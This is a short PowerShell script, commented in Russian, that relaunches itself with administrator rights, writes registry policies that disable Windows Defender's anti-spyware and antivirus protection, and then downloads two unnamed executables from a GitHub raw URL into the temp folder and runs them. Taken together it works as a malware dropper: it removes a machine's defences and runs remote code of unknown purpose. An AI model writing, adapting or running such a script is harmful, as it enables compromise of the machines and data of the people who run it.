Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# Отключение Defender
Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
New-Item -Path "$DefenderPath\Real-Time Protection" -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force
Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# Скачивание и запуск файлов
Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP

# Первый файл
Write-Host "[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe" -OutFile "$temp\proga1.exe" -UseBasicParsing
Write-Host "Running proga1.exe" -ForegroundColor Green
Start-Process "$temp\proga1.exe"

# Второй файл
Write-Host "[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe" -OutFile "$temp\proga2.exe" -UseBasicParsing
Write-Host "Running proga2.exe" -ForegroundColor Green
Start-Process "$temp\proga2.exe"

Write-Host ""
Write-Host "=== ALL DONE ===" -ForegroundColor Green
Pause
